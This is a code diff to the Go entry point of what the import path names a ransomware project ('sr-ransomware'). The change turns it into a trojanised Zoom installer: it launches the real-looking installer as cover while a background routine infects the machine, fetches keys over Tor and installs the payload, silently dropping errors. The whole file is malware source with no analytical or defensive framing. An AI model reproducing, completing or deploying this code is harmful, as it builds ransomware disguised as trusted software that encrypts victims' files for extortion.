@@ -1,23 +1,27 @@
+// +build windows,zoom,tor
+
 package main
 
-import (
-    "log"
-
-    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
-)
+import "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 
 func main() {
-    // TODO: start actual zoom installer and install payloads on victim
+    done := make(chan struct{})
+    go runInfection(done)
+    victim.RunZoomInstaller()
+    <-done
+}
+
+func runInfection(done chan<- struct{}) {
+    defer close(done)
     ok, err := victim.Infect()
-    if err != nil {
-        log.Fatal(err)
-    }
-    if !ok {
+    if err != nil || !ok {
         // victim has already been infected
+        // or some IO error occurred
         return
     }
     err = victim.DownloadKeysFromTor()
     if err != nil {
-        log.Fatal(err)
+        return
     }
+    victim.InstallPayload()
 }
